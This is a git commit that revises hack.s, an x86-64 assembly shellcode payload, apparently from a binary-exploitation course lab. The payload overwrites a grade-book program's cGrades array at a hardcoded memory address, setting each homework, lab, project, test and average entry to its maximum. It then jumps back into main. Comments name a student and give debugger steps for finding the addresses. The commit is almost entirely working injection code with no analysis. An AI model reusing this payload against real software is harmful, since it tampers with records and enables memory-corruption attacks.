2fbb90b48fdfb8b8682872c7cc00c517ca2af0dc
makarca <makarca@cs.binghamton.edu>
2025-12-08 19:19:15 -0500

    deneme

--- hack.s
+++ hack.s
@@ -1,47 +1,49 @@
 .text
 .globl _start
 _start:
-    # Minimal working shellcode - just modify the grades we need
-    # For Akarca_Tolga (student 0 in section C)
+    # Compact version - use loops to save space
     
-    movabs $0x55555555bc00, %rax    # cGrades base - GET FROM: p/x &cGrades
+    # Get cGrades address (REPLACE 0x404060 with your address from: p/x &cGrades)
+    movabs $0x55555555bc00, %r15
     
-    # HW (rows 0-8): max 6, offset = row*400
-    movl $6, 0(%rax)
-    movl $6, 400(%rax)
-    movl $6, 800(%rax)
-    movl $6, 1200(%rax)
-    movl $6, 1600(%rax)
-    movl $6, 2000(%rax)
-    movl $6, 2400(%rax)
-    movl $6, 2800(%rax)
-    movl $6, 3200(%rax)
+    # Set HW grades (rows 0-8) to 6
+    mov $6, %eax
+    mov $0, %ecx          # counter
+hw_loop:
+    mov %eax, (%r15,%rcx,1)
+    add $400, %ecx
+    cmp $3600, %ecx
+    jl hw_loop
     
-    # Labs (rows 9-18): max 7
-    movl $7, 3600(%rax)
-    movl $7, 4000(%rax)
-    movl $7, 4400(%rax)
-    movl $7, 4800(%rax)
-    movl $7, 5200(%rax)
-    movl $7, 5600(%rax)
-    movl $7, 6000(%rax)
-    movl $7, 6400(%rax)
-    movl $7, 6800(%rax)
-    movl $7, 7200(%rax)
+    # Set Lab grades (rows 9-18) to 7
+    mov $7, %eax
+    mov $3600, %ecx
+lab_loop:
+    mov %eax, (%r15,%rcx,1)
+    add $400, %ecx
+    cmp $7600, %ecx
+    jl lab_loop
     
-    # Projects (rows 19-22): max 59
-    movl $59, 7600(%rax)
-    movl $59, 8000(%rax)
-    movl $59, 8400(%rax)
-    movl $59, 8800(%rax)
+    # Set Project grades (rows 19-22) to 59
+    mov $59, %eax
+    mov $7600, %ecx
+prj_loop:
+    mov %eax, (%r15,%rcx,1)
+    add $400, %ecx
+    cmp $9200, %ecx
+    jl prj_loop
     
-    # Tests (rows 23-24): max 61
-    movl $61, 9200(%rax)
-    movl $61, 9600(%rax)
+    # Set Test grades (rows 23-24) to 61
+    mov $61, %eax
+    mov %eax, 9200(%r15)
+    mov %eax, 9600(%r15)
     
-    # AVG (row 25)
-    movl $100, 10000(%rax)
+    # Set AVG to 100 directly (simpler than calling getAvg)
+    mov $100, %eax
+    mov %eax, 10000(%r15)
     
-    # Return - GET FROM: disassemble main, find address after "call getUserLine"
-    movabs $0x55555555bc00, %rax
+    # Return to main (REPLACE 0x4015b0 with your return address)
+    movabs $0x55555555631c, %rax
     jmp *%rax
+
+    
